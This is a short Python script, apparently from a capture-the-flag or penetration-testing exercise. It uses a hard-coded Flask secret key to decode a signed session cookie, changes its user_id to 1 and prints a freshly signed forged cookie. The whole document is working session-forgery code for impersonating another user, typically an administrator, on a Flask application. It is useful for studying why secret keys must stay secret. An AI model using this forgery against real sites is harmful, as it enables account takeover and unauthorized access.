import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

# get the contents of a flask session cookie given the server secret key
salt = 'cookie-session'
secret_key = "3589a201d98658da606797c074cc2216"
serializer = TaggedJSONSerializer()
signer_kwargs = {
    'key_derivation': 'hmac',
    'digest_method': hashlib.sha1 # could also be another form of encryption (sha256, sha512)
}
s = URLSafeTimedSerializer(secret_key, serializer=serializer, salt=salt, signer_kwargs = signer_kwargs)

session_cookie = ".eJwlz0uKwzAQRdG9aOyBVKqPnM2YUn3oEOgGOxmF7D2Cnr8L573LkWdcP-X2PF-xlePu5VYmKuYYymY6BZN8mtYQEpjEdSTZBOhcSXCvgpi7q3ZhtwAnttkM65SukG5MwwjF2EbaoM5kBqHANHPNKHxXxoxdA7N2r1K2YteZx_PvEb_LYygQzXrrrBUauQNrTNVFgjbclygbt9W9rjj_T2D5fAFVyEBb.D05rWA.pjfG73tnMK5M3FRejbLAsr-knBM"
dcookie = s.loads(session_cookie)


dcookie['user_id'] = 1

print dcookie

print s.dumps(dcookie)

